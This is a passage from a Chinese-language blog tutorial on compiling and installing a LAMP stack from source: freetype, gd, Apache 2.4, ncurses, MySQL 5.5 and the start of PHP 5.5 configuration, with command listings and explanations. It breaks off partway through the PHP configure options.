<h2 id="Linux-freetype安装"><a href="#Linux-freetype安装" class="headerlink" title="Linux freetype安装"></a>Linux freetype安装</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[<span class="symbol">root@</span>localhost jpeg<span class="number">-6</span>b]# cd /usr/local/src/freetype<span class="number">-2.4</span><span class="number">.0</span></span><br><span class="line">#进入freetype解压缩目录</span><br><span class="line">[<span class="symbol">root@</span>localhost freetype<span class="number">-2.4</span><span class="number">.0</span>]# ./configure --prefix=/usr/local/freetype</span><br><span class="line">#编译前配置，指定安装位置</span><br><span class="line">[<span class="symbol">root@</span>localhost freetype<span class="number">-2.4</span><span class="number">.0</span>]# make</span><br><span class="line">#编译</span><br><span class="line">[<span class="symbol">root@</span>localhost freetype<span class="number">-2.4</span><span class="number">.0</span>]# make install</span><br><span class="line">#编译安装</span><br></pre></td></tr></table></figure>

<p><img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/26.png" alt="26"></p>
<h2 id="Linux-gd库安装"><a href="#Linux-gd库安装" class="headerlink" title="Linux gd库安装"></a>Linux gd库安装</h2><ol>
<li><p>进入 gd 库解压缩目录</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="symbol">root@</span>localhost ~]# cd /usr/local/src/libgd<span class="number">-2.1</span><span class="number">.0</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>修改gd_png.c文件</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="symbol">@localhost</span> libgd<span class="number">-2.1</span><span class="number">.0</span>]<span class="meta"># vim ./src/gd_png.c</span></span><br><span class="line"><span class="meta">#把文件中 <span class="meta-keyword">include</span> <span class="string">"png.h"</span>改为 <span class="meta-keyword">include</span> <span class="string">"/usr/local/libpng/include/png.h"</span></span></span><br></pre></td></tr></table></figure>

<img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/27.png" alt="27" style="zoom:200%;">

<p><img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/28.png" alt="28"></p>
<p>如果不修改 gd_png.c 文件，则默认会在当前目录下搜索 png.h 文件；因为 libpng 安装在 /usr/local/libpng/ 目录中，所以在当前目录不能找到，就会报错；把 png.h 的正确路径“/usr/local/libpng/include/png.h”写入，报错就能解决。；</p>
</li>
<li><p>编译安装</p>
<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost libgd<span class="number">-2.1</span><span class="number">.0</span>]# ./configure --prefix=/usr/local/gd2 --<span class="keyword">with</span>-jpeg=/usr/local/jpeg6 --<span class="keyword">with</span>-freetype=/usr/local/freetype --<span class="keyword">with</span>-png=/usr/local/libpng</span><br><span class="line">--prefix #指定安装位置</span><br><span class="line">--<span class="keyword">with</span>-jpeg #指定jpeg6的位置</span><br><span class="line">--<span class="keyword">with</span>-freetype #指定freetype的位置</span><br><span class="line">--<span class="keyword">with</span>-png #指定libpng的位置</span><br><span class="line">#编译前配置</span><br><span class="line">#因为gd库需要调用前面安装的zlib、jpeg、freetype和libpng，所以需要指定它们的安装位置，才能正确调用这些软件。不过因为前面安装zlib时没有指定安装位置，所以不用指定——<span class="keyword">with</span>-zlib=/usr/local/zlib/选项，gd会自动到默认安装位置中寻找zlib</span><br><span class="line">[root@localhost libgd<span class="number">-2.1</span><span class="number">.0</span>]# make</span><br><span class="line">#编译</span><br><span class="line">[root@localhost libgd<span class="number">-2.1</span><span class="number">.0</span>]# make install</span><br><span class="line">#编译安装</span><br></pre></td></tr></table></figure>

<p><img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/29.png" alt="29"></p>
</li>
</ol>
<h2 id="Linux-Apache安装"><a href="#Linux-Apache安装" class="headerlink" title="Linux Apache安装"></a>Linux Apache安装</h2><ol>
<li><p>复制 apr 和 apr-util 库，这里是 Apache 2.4 自己的 Bug，我们必须手工复制 apr、apr-util 和 pcre 这三个库，才可以正确安装 Apache 2.4；</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp -r <span class="regexp">/usr/</span>local<span class="regexp">/src/</span>apr-<span class="number">1.4</span>.<span class="number">6</span> <span class="regexp">/usr/</span>local<span class="regexp">/src/</span>httpd-<span class="number">2.4</span>.<span class="number">43</span><span class="regexp">/srclib/</span>apr</span><br><span class="line">cp -r <span class="regexp">/usr/</span>local<span class="regexp">/src/</span>apr-util-<span class="number">1.4</span>.<span class="number">1</span> <span class="regexp">/usr/</span>local<span class="regexp">/src/</span>httpd-<span class="number">2.4</span>.<span class="number">43</span><span class="regexp">/srclib/</span>apr-util</span><br><span class="line"><span class="comment">#这两个包先要解压缩，然后改名复制到指定位置</span></span><br></pre></td></tr></table></figure>

<p><img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/30.png" alt="30"></p>
</li>
<li><p>安装 pcre 源码包，pcre 是一个用 C 语言编写的正则表达式函数库，Apache 和 PHP 默认使用的就是 pcre 正则表达式规则 ；</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="symbol">@localhost</span> ~]<span class="meta"># cd /usr/local/src/pcre-8.34</span></span><br><span class="line"><span class="meta">#进入解压缩目录</span></span><br><span class="line">[root<span class="symbol">@localhost</span> pcre<span class="number">-8.34</span>]<span class="meta"># ./configure</span></span><br><span class="line"><span class="meta">#编译前配置</span></span><br><span class="line">[root<span class="symbol">@localhost</span> pcre<span class="number">-8.34</span>]<span class="meta"># make</span></span><br><span class="line"><span class="meta">#编译</span></span><br><span class="line">[root<span class="symbol">@localhost</span> pcre<span class="number">-8.34</span>]<span class="meta"># make install</span></span><br><span class="line"><span class="meta">#编译安装</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>进入 Apache 解压缩目录</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="symbol">root@</span>localhost pcre<span class="number">-8.34</span>]# cd /usr/local/src/httpd<span class="number">-2.4</span><span class="number">.43</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>编译前配置</p>
<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">root@</span><span class="string">localhost </span><span class="string">httpd-2.</span>4.<span class="string">43]</span><span class="comment"># ./configure --prefix=/usr/local/apache2 --sysconfdir=/usr/local/apache2/etc --with-included-apr --enable-so --enable-deflate=shared --enable-expires=shared --enable-rewrite-shared</span></span><br><span class="line"><span class="built_in">--prefix</span> <span class="comment">#指定Apache安装目录</span></span><br><span class="line"><span class="built_in">--sysconfdir</span> <span class="comment">#指定Apache配置文件保存目录</span></span><br><span class="line"><span class="built_in">--with-included-apr</span> <span class="comment">#使用捆绑APR/APR-Util 的副本</span></span><br><span class="line"><span class="built_in">--enable-so</span> <span class="comment">#以动态共享对象(DSO)方式编译</span></span><br><span class="line"><span class="built_in">--enable-deflate=shared</span> <span class="comment">#启用编小传输编玛支持的模块</span></span><br><span class="line"><span class="built_in">--enable-expires=shared</span> <span class="comment">#根据用户的特别设定来生成失效和隐藏控制的HTTP头信息</span></span><br><span class="line"><span class="built_in">--enable-rewrite-shared</span> <span class="comment">#启动重写功能的模块</span></span><br></pre></td></tr></table></figure>

<p><img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/31.png" alt="31"></p>
</li>
<li><p>编译安装</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="symbol">root@</span>localhost httpd<span class="number">-2.4</span><span class="number">.43</span>]# make</span><br><span class="line">[<span class="symbol">root@</span>localhost httpd<span class="number">-2.4</span><span class="number">.43</span>]# make install</span><br></pre></td></tr></table></figure>
</li>
<li><p>启动Apache，并进行测试</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[<span class="symbol">root@</span>localhost httpd<span class="number">-2.4</span><span class="number">.43</span>]# /usr/local/apache2/bin/apachectl start</span><br><span class="line">#启动Apache</span><br><span class="line">[<span class="symbol">root@</span>localhost httpd<span class="number">-2.4</span><span class="number">.43</span>]# netstat -tlun | grep <span class="number">80</span></span><br><span class="line">tcp6       <span class="number">0</span>      <span class="number">0</span> :::<span class="number">80</span>                   :::*                    LISTEN  </span><br><span class="line">#<span class="number">80</span>端口已经启动，说明Apache已经启动了</span><br></pre></td></tr></table></figure>

<p>用浏览器测试一下Apache服务器是否可以访问；</p>
<p><img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/32.png" alt="32"></p>
</li>
<li><p>设置 Apache 开机自启</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim <span class="meta-keyword">/etc/</span>rc.d/rc.local </span><br><span class="line"><span class="meta">#在文件中加入apache启动命令</span></span><br><span class="line"><span class="meta-keyword">/usr/</span>local<span class="meta-keyword">/apache2/</span>bin/apachectl start</span><br></pre></td></tr></table></figure>

<p><img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/33.png" alt="33"></p>
</li>
</ol>
<h2 id="Linux-ncurses安装"><a href="#Linux-ncurses安装" class="headerlink" title="Linux ncurses安装"></a>Linux ncurses安装</h2><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="symbol">@localhost</span> ~]<span class="meta"># cd /usr/locai/src/ncurses-6.2</span></span><br><span class="line"><span class="meta">#进入ncurses解压缩目录</span></span><br><span class="line">[root<span class="symbol">@localhost</span> ncurses<span class="number">-6.2</span>]<span class="meta"># ./configure --with-shared --without-debug --without-ada --enable-overwrite  </span></span><br><span class="line">--<span class="keyword">with</span>-shared <span class="meta">#生成共享库</span></span><br><span class="line">--without-debug <span class="meta">#不生成 debug 库</span></span><br><span class="line">--without-ada <span class="meta">#不编译为ada绑定，因为进入chroot环境不能用ada</span></span><br><span class="line">--enable-overwrite <span class="meta">#定义把头文件安装到/tools/<span class="meta-keyword">include</span>目录下，而不是/tools/<span class="meta-keyword">include</span>/ncurses 目录下</span></span><br><span class="line">[root<span class="symbol">@localhost</span> ncurses<span class="number">-6.2</span>]<span class="meta"># make </span></span><br><span class="line">[root<span class="symbol">@localhost</span> ncurses<span class="number">-6.2</span>)<span class="meta"># make install</span></span><br></pre></td></tr></table></figure>

<p><img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/34.png" alt="34"></p>
<h2 id="Linux-MySQL安装"><a href="#Linux-MySQL安装" class="headerlink" title="Linux MySQL安装"></a>Linux MySQL安装</h2><ol>
<li><p>添加 mysql 用户和 mysql 用户组</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="symbol">@localhost</span> ~]<span class="meta"># groupadd mysql</span></span><br><span class="line"><span class="meta">#添加mysql用户组</span></span><br><span class="line">[root<span class="symbol">@localhost</span> ～]<span class="meta"># useradd -g mysql mysql</span></span><br><span class="line"><span class="meta">#添加mysql用户，同时指定mysql用户的初始组是mysql组</span></span><br></pre></td></tr></table></figure>

<p>这里添加的 mysql 用户和用户组是稍后用来给 MySQL 安装目录分配权限用的，所以并不需要设定密码，因为这个用户是不能直接登录 Linux 系统的 ；</p>
</li>
<li><p>安装 cmake命令</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum -y <span class="keyword">install </span>cmake</span><br><span class="line">yum -y <span class="keyword">install </span><span class="keyword">bison</span></span><br><span class="line"><span class="keyword">yum </span>-y <span class="keyword">install </span>gcc gcc-c++ ncurses ncurses-devel</span><br></pre></td></tr></table></figure>

<p><img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/35.png" alt="35"></p>
</li>
<li><p>进入 MySQL 解压缩目录</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="symbol">root@</span>localhost ~]# cd /usr/local/src/mysql<span class="number">-5.5</span><span class="number">.39</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>编译前配置</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost mysql-5.5.39]# cmake <span class="attribute">-DCMAKE_INSTALL_PREFIX</span>=/usr/local/mysql <span class="attribute">-DMYSQL_UNIX_ADDR</span>=/tmp/mysql.sock <span class="attribute">-DEXTRA_CHARSETS</span>=all <span class="attribute">-DDEFAULT_CHARSET</span>=utf8 <span class="attribute">-DDEFAULT_COLLATION</span>=utf8_general_ci <span class="attribute">-DWITH_MYISAM_STORAGE_ENGINE</span>=1 <span class="attribute">-DWITH_INNOBASE_STORAGE_ENGINE</span>=1 <span class="attribute">-DWITH_MEMORY_STORAGE_ENGINE</span>=1 <span class="attribute">-DWITH_READLINE</span>=1 <span class="attribute">-DENABLED_LOCAL_INFILE</span>=1 <span class="attribute">-DMYSQL_USER</span>=mysql <span class="attribute">-DMYSQL_TCP_PORT</span>=3306</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">-DCMAKE_INSTALL_PREFIX</span>=/usr/local/mysql #指定安装位置</span><br><span class="line"><span class="attribute">-DMYSQL_UNIX_ADDR</span>=/tmp/mysql.sock #指定socket（套接字）文件位置</span><br><span class="line"><span class="attribute">-DEXTRA_CHARSETS</span>=all #支持所有的扩展字符集</span><br><span class="line"><span class="attribute">-DDEFAULT_CHARSET</span>=utf8 #指定默认字符集</span><br><span class="line"><span class="attribute">-DDEFAULT_COLLATION</span>=utf8_general_ci #指定默认字符校对</span><br><span class="line"><span class="attribute">-DWITH_MYISAM_STORAGE_ENGINE</span>=1 #安装myisam存储引擎</span><br><span class="line"><span class="attribute">-DWITH_INNOBASE_STORAGE_ENGINE</span>=1 #安装innodb存储引擎</span><br><span class="line"><span class="attribute">-DWITH_MEMORY_STORAGE_ENGINE</span>=1 #安装memory存储引擎</span><br><span class="line"><span class="attribute">-DWITH_READLINE</span>=1 #支持readline库</span><br><span class="line"><span class="attribute">-DENABLED_LOCAL_INFILE</span>=1 #启用加载本地数据</span><br><span class="line"><span class="attribute">-DMYSQL_USER</span>=mysql #指定MySQL运行用户</span><br><span class="line"><span class="attribute">-DMYSQL_TCP_PORT</span>=3306 #指定MySQL端口</span><br></pre></td></tr></table></figure>
</li>
<li><p>编译安装</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="symbol">root@</span>localhost mysql<span class="number">-5.5</span><span class="number">.39</span>]# make</span><br><span class="line">[<span class="symbol">root@</span>localhost mysql<span class="number">-5.5</span><span class="number">.39</span>]# make install</span><br></pre></td></tr></table></figure>

<p>在编译的时候出现错误：</p>
<p><img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/37.png" alt="37"></p>
<p>解决方法：</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim <span class="meta-keyword">/usr/</span>local<span class="meta-keyword">/src/</span>mysql<span class="number">-5.5</span><span class="number">.39</span><span class="meta-keyword">/client/</span>mysql.cc</span><br><span class="line"><span class="meta">#在第2658行的<span class="string">'\0'</span>q\前面加上(char*)，强制转换为字符指针</span></span><br></pre></td></tr></table></figure>

<p><img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/38.png" alt="38"></p>
</li>
<li><p>重新配置，编译安装</p>
<p><img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/39.png" alt="39"></p>
</li>
<li><p>生成MySQL的配置文件，并修改配置文件；这个配置文件不用手工建立，在 MySQL 安装目录中给我们准备了模板文件，只需把模板文件复制到指定位置并改名即可</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost mysql-<span class="number">5.5</span>.<span class="number">39</span>]# <span class="keyword">cp</span> /usr/local/mysql/support-<span class="keyword">files</span>/my-medium.<span class="keyword">cnf</span> /etc/my.<span class="keyword">cnf</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>修改 MySQL 安装目录的权限</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="symbol">@localhost</span> mysql<span class="number">-5.5</span><span class="number">.39</span>]<span class="meta"># cd /usr/local/mysql</span></span><br><span class="line"><span class="meta">#进入MySQL安装目录</span></span><br><span class="line">[root<span class="symbol">@localhost</span> mysql]<span class="meta"># chown -R root /usr/local/mysql</span></span><br><span class="line"><span class="meta">#把当前目录下所有文件的所有者改为root用户</span></span><br><span class="line">[root<span class="symbol">@localhost</span> mysql]<span class="meta"># chgrp -R mysql /usr/local/mysql</span></span><br><span class="line"><span class="meta">#把当前目录下所有文件的所属组改为mysql组</span></span><br></pre></td></tr></table></figure>

<p><img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/40.png" alt="40"></p>
</li>
<li><p>初始化数据库；源码包安装的 MySQL 中所有的数据库默认都保存在 /usr/local/mysql/data/ 目录中，MySQL 的初始数据库 mysql 库和 test 库也会保存在这个目录中；但是，如果仔细查看 /usr/local/mysql/data/ 目录，就会发现这个目录中只有两个空目录，并没有任何数据。也就是说，MySQL 中的所有数据库是不存在的，那么这个 MySQL 是不能使用的，因为 MySQL 的所有用户是要保存在 user 表中的，而 user 表保存在 mysql 库中，而 mysql 库是保存在 /usr/local/mysql/data/ 目录中的；那么，我们现在需要在 data 目录中建立 MySQL 的初始数据库 ；</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/<span class="keyword">local</span>/mysql/scripts/mysql_install_db <span class="comment">--user=mysql</span></span><br></pre></td></tr></table></figure>

<p><img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/41.png" alt="41"></p>
</li>
<li><p>继续修改MySQL安装目录的权限</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="symbol">@localhost</span> mysql]<span class="meta"># chown -R root /usr/local/mysql</span></span><br><span class="line"><span class="meta">#把当前目录下所有文件的所有者改为root用户</span></span><br><span class="line">[root<span class="symbol">@localhost</span> mysql]<span class="meta"># chown -R mysql /usr/local/mysql/data</span></span><br><span class="line"><span class="meta">#把data目录的所有者改为mysql用户</span></span><br></pre></td></tr></table></figure>

<p><img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/42.png" alt="42"></p>
</li>
<li><p>启动 MySQL 服务器，并保证 mysql 服务开机自启动； </p>
<p>MySQL 服务器的安装已经完成，我们可以尝试启动 MySQL 服务器：</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[<span class="symbol">root@</span>localhost mysql]# /usr/local/mysql/bin/mysqld_safe --user=mysql &amp;</span><br><span class="line">#使用mysql用户启动MySQL服务器，并在后台持续运行</span><br><span class="line">[<span class="symbol">root@</span>localhost ~]# netstat -tlun | grep <span class="number">3306</span></span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">3306</span>            <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN</span><br></pre></td></tr></table></figure>

<p><img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/43.png" alt="43"></p>
<p><img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/44.png" alt="44"></p>
<p>设置 mysql 服务开机自启动 ；</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># vim /etc/rc.local</span></span><br><span class="line"><span class="comment">#修改自启动配置文件，加入如下的mysql服务标准启动命令</span></span><br><span class="line">/usr/<span class="keyword">local</span>/mysql/bin/mysqld_safe <span class="comment">--user=mysql &amp;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>设定 MySQL 中 root 用户的密码，并登录；</p>
<p>MySQL 数据库的管理员也是 root，我们需要给 MySQL 的本地用户设定一个密码，这里使用 Linux 的命令 mysqladmin 设定 MySQL 的 root 用户的密码 </p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost mysql]# /usr/local/mysql/bin/mysqladmin -u root password 123456</span><br><span class="line"><span class="comment">#给MySQL的root用户设定密码为123456</span></span><br><span class="line">[root@localhost mysql]# /usr/local/mysql/bin/mysql -u root -p</span><br><span class="line"><span class="comment">#使用root用户登录mysql</span></span><br><span class="line">Enter password： #输入正确的密码</span><br><span class="line">Welcome <span class="keyword">to</span> the MySQL monitor.  Commands end with ; <span class="keyword">or</span> \g.</span><br><span class="line">Your MySQL<span class="built_in"> connection </span>id is 5</span><br><span class="line">Server version: 5.5.39-log Source distribution</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2014, Oracle <span class="keyword">and</span>/<span class="keyword">or</span> its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation <span class="keyword">and</span>/<span class="keyword">or</span> its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type <span class="string">'help;'</span> <span class="keyword">or</span> <span class="string">'\h'</span> <span class="keyword">for</span> help.<span class="built_in"> Type </span><span class="string">'\c'</span> <span class="keyword">to</span> clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; </span><br><span class="line"><span class="comment">#看到了MySQL的交互界面</span></span><br><span class="line">mysql&gt; \s #查询服务器状态信息</span><br><span class="line">--------------</span><br><span class="line">/usr/local/mysql/bin/mysql  Ver 14.14 Distrib 5.5.39, <span class="keyword">for</span> Linux (x86_64) using readline 5.1</span><br><span class="line"></span><br><span class="line">Connection id:		6</span><br><span class="line">Current database:	</span><br><span class="line">Current user:		root@localhost</span><br><span class="line">SSL:			<span class="keyword">Not</span> <span class="keyword">in</span> use</span><br><span class="line">Current pager:		stdout</span><br><span class="line">Using outfile:		<span class="string">''</span></span><br><span class="line">Using delimiter:	;</span><br><span class="line">Server version:		5.5.39-log Source distribution</span><br><span class="line">Protocol version:	10</span><br><span class="line">Connection:		Localhost via UNIX socket</span><br><span class="line">Server characterset:	utf8</span><br><span class="line">Db     characterset:	utf8</span><br><span class="line">Client characterset:	utf8</span><br><span class="line">Conn.  characterset:	utf8</span><br><span class="line">UNIX socket:		/tmp/mysql.sock</span><br><span class="line">Uptime:			16 min 56 sec</span><br><span class="line"></span><br><span class="line">Threads: 1  Questions: 11  Slow queries: 0  Opens: 33  Flush tables: 2  Open tables: 0  Queries per second avg: 0.010</span><br><span class="line">--------------</span><br><span class="line"></span><br><span class="line">mysql&gt; exit</span><br><span class="line"><span class="comment">#退出MySQL</span></span><br></pre></td></tr></table></figure>

<p><img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/46.png" alt="46"></p>
</li>
</ol>
<h2 id="Linux安装PHP"><a href="#Linux安装PHP" class="headerlink" title="Linux安装PHP"></a>Linux安装PHP</h2><ol>
<li><p>安装libtool和libtool-ltdl</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="symbol">@localhost</span> ~]<span class="meta"># yum -y install <span class="string">"libtool*"</span></span></span><br><span class="line">[root<span class="symbol">@localhost</span> ~]<span class="meta"># yum -y install <span class="string">"libtool-ltdl*"</span></span></span><br></pre></td></tr></table></figure>
</li>
<li><p>编译安装 php 源码包</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost mysql]# cd /usr/local/src/php-5.5.23</span><br><span class="line">[root@localhost php-5.5.23]# ./configure <span class="attribute">--prefix</span>=/usr/local/php <span class="attribute">--with-config-file-path</span>=/usr/local/php/etc <span class="attribute">--with-apxs2</span>=/usr/local/apache2/bin/apxs <span class="attribute">--with-mysql</span>=/usr/local/mysql <span class="attribute">--with-libxml-dir</span>=/usr/local/libxml2 <span class="attribute">--with-jpeg-dir</span>=/usr/local/jpeg6 <span class="attribute">--with-png-dir</span>=/usr/local/libpng <span class="attribute">--with-freetype-dir</span>=/usr/local/freetype --with-gd <span class="attribute">--with-mcrypt</span>=/usr/local/libmcrypt <span class="attribute">--with-mysqli</span>=/usr/local/mysql/bin/mysql_config --enable-soap <span class="attribute">--enable-mbstring</span>=all --enable-sockets <span class="attribute">--with-pdo-mysql</span>=/usr/local/mysql</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">--prefix</span>=/usr/local/php #指定安装位置</span><br><span class="line"><span class="attribute">--with-config-file-path</span>=/usr/local/php/etc #指定PHP配置文件位置</span><br><span class="line"><span class="attribute">--with-apxs2</span>=/usr/local/apache2/bin/apxs #调用apache2</span><br><span class="line"><span class="attribute">--with-mysql</span>=/usr/local/mysql #调用mysql</span><br><span class="line"><span class="attribute">--with-libxml-dir</span>=/usr/local/libxml2 #调用libxml2库</span><br><span class="line"><span class="attribute">--with-jpeg-dir</span>=/usr/local/jpeg6 #调用jpeg库</span><br><span class="line"><span class="attribute">--with-png-dir</span>=/usr/local/libpng #调用libpng库</span><br><span class="line"><span class="attribute">--with-freetype-dir</span>=/usr/local/freetype #调用freetype库</span><br><span class="line">--with-gd #调用gd库，不指定就会利用php自带的gd source编译</span><br><span 